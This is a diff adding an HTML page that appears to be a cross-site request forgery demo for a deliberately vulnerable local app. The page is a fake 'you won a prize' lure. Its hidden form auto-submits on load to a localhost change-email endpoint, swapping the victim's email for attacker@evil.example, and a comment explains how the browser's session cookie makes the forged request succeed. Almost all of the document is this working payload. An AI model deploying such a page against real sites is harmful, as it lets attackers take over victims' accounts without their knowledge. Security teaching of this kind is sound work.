@@ -1,0 +1,24 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>Win a free prize!</title>
+<body style="font-family:sans-serif;padding:40px">
+  <h1>🎉 Congratulations — you won a prize!</h1>
+  <p>Loading your reward…</p>
+
+  <!--
+    This page lives on an ATTACKER-controlled site. The victim only has to be
+    logged in to the target app in the same browser and then open this page.
+    The hidden form below auto-submits a cross-site POST to the target's
+    state-changing endpoint. The browser automatically attaches the victim's
+    session cookie, so the request is performed AS the victim — with no token
+    and no interaction. That is Cross-Site Request Forgery (CSRF).
+  -->
+  <form id="csrf" action="http://localhost:3004/change-email-vulnerable" method="POST">
+    <input type="hidden" name="email" value="attacker@evil.example">
+  </form>
+
+  <script>
+    // Fire the forged request as soon as the victim lands on the page.
+    document.getElementById('csrf').submit();
+  </script>
+</body>
